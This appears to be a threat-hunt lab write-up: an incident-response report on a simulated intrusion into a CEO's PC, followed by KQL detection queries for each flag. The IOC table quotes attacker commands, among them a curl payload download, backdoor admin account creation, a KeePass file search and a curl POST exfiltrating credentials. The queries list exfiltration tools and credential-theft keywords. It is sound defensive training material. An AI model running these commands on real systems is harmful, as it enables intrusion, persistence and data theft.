# DEC20Threathunt

Incident Response report from Threat Hunt

<img width="525" height="795" alt="Screenshot 2025-12-24 at 2 43 46 PM" src="https://github.com/user-attachments/assets/786e43c2-f9c2-4e8f-a916-560ca4e42801" />

📝 INCIDENT RESPONSE REPORT

Date of Report: 2025-12-20 
Severity Level: HIGH  
Report Status: Open  
Escalated To: Incident Response Team  
Incident ID: AZUKI-2025-DEC-BRIDGE-TAKEOVER
Analyst: Brian Sanford

---

## 📌 SUMMARY OF FINDINGS

- Five days after the November 19th file server breach, threat actors re-entered the environment with elevated sophistication, pivoting from a compromised workstation to the CEO’s administrative PC (**azuki-adminpc**).
- Lateral movement originated from internal source **10.1.0.204**, indicating prior credential theft and internal reconnaissance.
- The attacker leveraged compromised credentials belonging to **yuki.tanaka**, distinct from the original November breach account.
- A malicious payload was downloaded from external file hosting service **litter.catbox.moe** using **curl.exe**, masquerading as a Windows update archive.
- The payload was extracted using **7-Zip with a password-protected archive**, indicating deliberate evasion of static inspection.
- A **Meterpreter implant (meterpreter.exe)** was deployed, providing full interactive C2 control.
- **Named pipe–based persistence** (`\Device\NamedPipe\msf-pipe-5722`) was established, confirming Metasploit framework usage.
- The attacker executed **Base64-encoded PowerShell commands** to create a backdoor administrator account (**yuki.tanaka2**) and escalate privileges.
- Extensive **domain, session, and network discovery** was conducted using native Windows utilities (`qwinsta.exe`, `nltest.exe`, `netstat.exe`).
- The threat actor searched for and harvested **password databases (KeePass)** and plaintext credential files.
- **Automated data collection** was performed using `robocopy.exe` to stage financial and credential data.
- Sensitive data was compressed into multiple archives and **exfiltrated to gofile.io**, a legitimate cloud storage service.
- The operation culminated in **browser credential theft**, extraction of **KeePass master passwords**, and confirmed financial data exfiltration.

---

## 👤 WHO

### Attacker Source & Infrastructure
- **Lateral Movement Source IP:** `10.1.0.204`  
- **Payload Hosting Service:** `litter.catbox.moe`  
- **Exfiltration Domain:** `gofile.io`  
- **Exfiltration IP:** `45.112.123.227`  

### Compromised Accounts
- `yuki.tanaka`  
- **Backdoor Account:** `yuki.tanaka2`  

### Compromised Systems
- **azuki-adminpc** (CEO Administrative PC)

---

## 📂 WHAT (Event Summary)

### 🚩 Flags & Indicators of Compromise (IOCs)

| Flag # | IOC Category | Flag Answer | Timestamp |
|------:|-------------|-------------|-----------|
| 1 | Lateral movement source IP | 10.1.0.204 | 2025-11-24 |
| 2 | Compromised account | yuki.tanaka | 2025-11-24 |
| 3 | Lateral movement target | azuki-adminpc | 2025-11-24 |
| 4 | Payload hosting service | litter.catbox.moe | 2025-11-25 |
| 5 | Malware download command | `curl.exe -L -o KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z` | 2025-11-25 |
| 6 | Archive extraction command | `7z.exe x KB5044273-x64.7z -p********` | 2025-11-25 |
| 7 | C2 implant | meterpreter.exe | 2025-11-25 |
| 8 | Named pipe persistence | `\Device\NamedPipe\msf-pipe-5722` | 2025-11-25 |
| 9 | Backdoor account creation | `net user yuki.tanaka2 B@ckd00r2024! /add` | 2025-11-25 |
| 10 | Backdoor username | yuki.tanaka2 | 2025-11-25 |
| 11 | Privilege escalation | `net localgroup Administrators yuki.tanaka2 /add` | 2025-11-25 |
| 12 | Session enumeration | qwinsta.exe | 2025-11-25 |
| 13 | Domain trust discovery | `nltest.exe /domain_trusts /all_trusts` | 2025-11-25 |
| 14 | Network enumeration | `netstat.exe -ano` | 2025-11-25 |
| 15 | Password DB search | `where /r C:\Users *.kdbx` | 2025-11-25 |
| 16 | Credential file | OLD-Passwords.txt | 2025-11-25 |
| 17 | Staging directory | `C:\ProgramData\Microsoft\Crypto\staging` | 2025-11-25 |
| 18 | Automated collection | `robocopy.exe …\Banking` | 2025-11-25 |
| 19 | Exfil archives | 8 unique archives | 2025-11-25 |
| 20 | Cred theft tool download | `curl.exe -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z` | 2025-11-25 |
| 21 | Browser credential theft | dpapi::chrome | 2025-11-25 |
| 22 | Exfil upload command | `curl.exe -X POST -F file=@credentials.tar.gz` | 2025-11-25 |
| 23 | Cloud exfil service | gofile.io | 2025-11-25 |
| 24 | Exfil destination IP | 45.112.123.227 | 2025-11-25 |
| 25 | Master password file | KeePass-Master-Password.txt | 2025-11-25 |

---

## ⏱ WHEN (UTC Timeline)

- **11-24** – Lateral movement detected from `10.1.0.204`  
- **11-25** – Payload download from `litter.catbox.moe`  
- **11-25** – Archive extraction & Meterpreter deployment  
- **11-25** – Backdoor admin account created  
- **11-25** – Credential discovery & data staging  
- **11-25** – Exfiltration to `gofile.io`  

---

## 🖥 WHERE (Infrastructure Impact)

### Compromised Host
- azuki-adminpc

### Attacker Infrastructure
- `litter.catbox.moe` (Payload hosting)  
- `gofile.io` (Data exfiltration)  
- `45.112.123.227` (Exfil destination)

### Malware & Staging Locations
- `C:\Windows\Temp\cache`  
- `C:\ProgramData\Microsoft\Crypto\staging`

---

## ❓ WHY (Attacker Motivation & Root Cause)

### Root Cause
- Stolen credentials from the November breach enabled internal lateral movement without detection.
- Lack of privileged account segmentation allowed direct access to executive systems.

### Attacker Objectives
- Establish persistent access to executive infrastructure.
- Harvest credentials and password databases.
- Steal financial and authentication data.
- Maintain covert long-term access using backdoor accounts and Meterpreter C2.

### Business Impact
- Exposure of financial records and credential vaults.
- Full compromise of CEO administrative environment.
- Severe reputational and regulatory risk.

---

## ⚙️ HOW (Full Attack Chain)

- Internal pivot via compromised credentials (`yuki.tanaka`)
- Payload download via `curl.exe`
- Password-protected archive extraction
- Meterpreter implant execution
- Named pipe persistence
- Base64 PowerShell backdoor creation
- Privilege escalation
- Domain, session, and network discovery
- Credential harvesting (KeePass, browser DPAPI)
- Automated data staging with Robocopy
- Multi-archive exfiltration to cloud storage

---

## 🚨 IMPACT ASSESSMENT

### Actual Impact
- Executive system compromise
- Credential vault exposure
- Financial data theft
- Persistent backdoor access

### Risk Level
**CRITICAL**

---

## 🛠 RECOMMENDATIONS

### 🔥 IMMEDIATE
- Disable `yuki.tanaka` and `yuki.tanaka2`
- Isolate `azuki-adminpc`
- Block `litter.catbox.moe` and `gofile.io`
- Reset all executive and privileged credentials

### ⏳ SHORT-TERM
- Rebuild compromised systems
- Audit all admin accounts
- Rotate KeePass master passwords
- Review lateral movement paths

### 🛡 LONG-TERM
- Enforce MFA everywhere
- Harden executive endpoints
- Monitor cloud storage exfiltration
- Detect encoded PowerShell
- Implement named pipe telemetry

# December 17th Threat Hunt – Bridge Takeover
## Full KQL Query Set with Use Cases

---

### Flag 1 – Lateral Movement: Source System Identification

**Use Case:**  
Identify systems involved in suspicious authentication activity during the breach window to confirm the initial lateral movement source.

DeviceLogonEvents
| where DeviceName contains "azuki"

---

### Flag 2 – Lateral Movement: Compromised Credential Identification

**Use Case:**  
Enumerate accounts used for remote interactive logons to identify credentials leveraged by the attacker.

DeviceLogonEvents
| where DeviceName contains "azuki"
| where LogonType == "RemoteInteractive"
| distinct AccountName

---

### Flag 3 – Lateral Movement: Target Device Identification

**Use Case:**  
Correlate compromised account, source IP, and logon type to identify the executive endpoint targeted by the attacker.

DeviceLogonEvents
| where AccountName == "yuki.tanaka"
| where DeviceName contains "azuki"
| where LogonType == "RemoteInteractive"
| where RemoteIP == "10.1.0.204"

---

### Flag 4 – Execution: Payload Hosting Service Discovery

**Use Case:**  
Detect outbound connections to external file-hosting services using common download utilities during malware delivery.

DeviceNetworkEvents
| where DeviceName contains "azuki-adminpc"
| where InitiatingProcessCommandLine has_any (
"curl",
"wget",
"Invoke-WebRequest",
"Invoke-RestMethod",
"bitsadmin",
"certutil",
"scp",
"sftp",
"ftp",
"rclone",
"azcopy",
"aws s3",
"gsutil"
)
| distinct RemoteUrl

---

### Flag 5 – Execution: Malware Download Command

**Use Case:**  
Identify the exact command used to retrieve malicious payloads from attacker infrastructure.

DeviceNetworkEvents
| where DeviceName contains "azuki-adminpc"
| where InitiatingProcessCommandLine has "curl"
| where RemoteUrl == "litter.catbox.moe"

---

### Flag 6 – Execution: Password-Protected Archive Extraction

**Use Case:**  
Detect extraction of encrypted archives staged in temporary directories to evade static inspection.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName in~ (
"7z.exe",
"7za.exe",
"7zr.exe",
"rar.exe",
"unrar.exe",
"winrar.exe",
"tar.exe",
"zip.exe"
)
| where ProcessCommandLine has_any (" x ", " e ", "-extract")
| where ProcessCommandLine has_any (" -p", "-P", "--password", "-pass")
| where ProcessCommandLine has_any (
"\\Temp",
"\\Downloads",
"\\AppData\\Local\\Temp"
)

---

### Flag 7 – Persistence: C2 Implant Execution

**Use Case:**  
Detect execution of Meterpreter, indicating interactive attacker control via Metasploit.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName == "meterpreter.exe"

---

### Flag 8 – Persistence: Named Pipe Backdoor

**Use Case:**  
Detect stealthy command-and-control channels implemented using named pipes.

DeviceEvents
| where DeviceName == "azuki-adminpc"
| extend ParsedFields = parse_json(AdditionalFields)
| extend PipeName = tostring(ParsedFields.PipeName)
| where isnotempty(PipeName)
| where PipeName startswith @"\Device\NamedPipe\"

---

### Flag 9 – Credential Access: Encoded PowerShell Execution

**Use Case:**  
Identify Base64-encoded PowerShell commands used to hide malicious account creation and privilege escalation.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any (
"-enc",
"-encodedcommand",
"FromBase64String"
)
| order by Timestamp desc

---

### Flag 12 – Discovery: Session Enumeration

**Use Case:**  
Detect enumeration of active RDP and user sessions for situational awareness.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName in~ ("query.exe", "qwinsta.exe")
| where ProcessCommandLine has_any (
"query user",
"query session",
"qwinsta"
)

---

### Flag 13 – Discovery: Domain Trust Enumeration

**Use Case:**  
Identify reconnaissance of domain trust relationships for lateral expansion planning.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any (
"domain_trusts",
"all_trusts"
)

---

### Flag 14 – Discovery: Network Enumeration

**Use Case:**  
Detect native utilities used to enumerate network connections and listening services.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName in~ (
"netstat.exe",
"arp.exe",
"route.exe",
"nbtstat.exe",
"ipconfig.exe"
)
| order by Timestamp desc

---

### Flag 15 – Credential Access: Password Database Discovery

**Use Case:**  
Detect recursive searches for password vaults such as KeePass and browser credential stores.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any (
"*.kdb",
"*.kdbx",
"*.psafe3",
"Login Data",
"logins.json",
"key4.db"
)
| where ProcessCommandLine has_any (
"C:\\Users",
"/s",
"-Recurse"
)

---

### Flag 16 – Credential Access: Plaintext Password Files

**Use Case:**  
Identify plaintext password files stored in user-accessible directories.

DeviceFileEvents
| where DeviceName contains "azuki-adminpc"
| where FileName endswith ".txt"
or FileName endswith ".lnk"
| where FolderPath has_any (
"Desktop",
"Downloads"
)
| distinct FileName

---

### Flag 17 – Collection: Data Staging Directory

**Use Case:**  
Detect attacker-created staging directories used to aggregate stolen data prior to exfiltration.

DeviceFileEvents
| where DeviceName contains "azuki-adminpc"
| where ActionType in~ (
"FileCreated",
"FileCopied",
"FileMoved"
)
| where FolderPath matches regex @"\\(temp|tmp|stage|staging|loot|dump|data|exfil)(\\|$)"

---

### Flag 18 – Collection: Automated Data Copying

**Use Case:**  
Detect scripted bulk data collection using Robocopy.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName == "robocopy.exe"

---

### Flag 20 – Credential Access: Post-Compromise Tool Download

**Use Case:**  
Detect secondary malicious tool downloads following initial compromise.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName in~ (
"powershell.exe",
"pwsh.exe",
"cmd.exe",
"certutil.exe",
"bitsadmin.exe",
"curl.exe",
"wget.exe"
)
| where ProcessCommandLine has_any (
"http://",
"https://"
)

---

### Flag 21 – Credential Access: Browser Credential Theft

**Use Case:**  
Detect DPAPI-based extraction of stored browser credentials.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any (
"dpapi",
"Login Data",
"Cookies",
"sharpchrome",
"lazagne"
)

---

### Flag 22 – Exfiltration: Data Upload Command

**Use Case:**  
Detect HTTP POST-based file uploads indicative of data exfiltration.

DeviceProcessEvents
| where DeviceName contains "azuki-adminpc"
| where FileName in~ (
"curl.exe",
"wget.exe",
"powershell.exe",
"pwsh.exe"
)
| where ProcessCommandLine has_any (
"POST",
"-X POST",
"-F",
"multipart"
)

---

### Flag 24 – Exfiltration: Destination Infrastructure

**Use Case:**  
Identify cloud storage services used for data exfiltration.

DeviceNetworkEvents
| where DeviceName contains "azuki-adminpc"
| where RemoteUrl has "gofile.io"

---

### Flag 25 – Credential Access: Master Password Extraction

**Use Case:**  
Detect creation of files containing master passwords indicating vault compromise.

DeviceFileEvents
| where DeviceName

